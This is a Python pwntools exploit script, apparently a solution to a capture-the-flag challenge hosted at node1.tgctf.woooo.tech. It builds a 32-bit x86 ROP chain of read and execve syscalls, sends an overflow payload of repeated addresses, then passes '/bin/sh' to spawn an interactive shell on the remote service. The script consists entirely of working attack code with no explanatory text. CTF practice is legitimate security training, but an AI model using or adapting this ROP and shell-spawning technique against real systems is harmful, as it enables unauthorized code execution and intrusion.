#!/usr/bin/env python
from pwn import *

context(log_level="debug", arch="i386", os="linux")
io = process("./pwn")
io = remote("node1.tgctf.woooo.tech",32610)
elf = ELF("./pwn")
buf = 0x80EF300
rop = (
    # read(0, buf, 100)
    p32(next(elf.search(asm("pop eax; ret"))))
    + p32(3)  # sys_read
    + p32(next(elf.search(asm("pop ebx; ret"))))
    + p32(0)  # fd
    + p32(next(elf.search(asm("pop ecx; ret"))))
    + p32(buf)  # buffer
    + p32(next(elf.search(asm("pop edx; ret"))))
    + p32(8)  # length
    + p32(next(elf.search(asm("int 0x80; ret"))))  # syscall
    +
    # execve(buf, 0, 0)
    p32(next(elf.search(asm("pop eax; ret"))))
    + p32(0xB)  # sys_execve
    + p32(next(elf.search(asm("pop ebx; ret"))))
    + p32(buf)  # filename
    + p32(next(elf.search(asm("pop ecx; ret"))))
    + p32(0)  # argv
    + p32(next(elf.search(asm("pop edx; ret"))))
    + p32(0)  # envp
    + p32(next(elf.search(asm("int 0x80; ret"))))  # syscall
)

io.recv()
io.sendline(rop)
payload = p32(0x80EF324) * (204 // 4)
io.recv()
#gdb.attach(io)
io.sendline(payload)
io.sendline(b"/bin/sh\x00")

io.interactive()
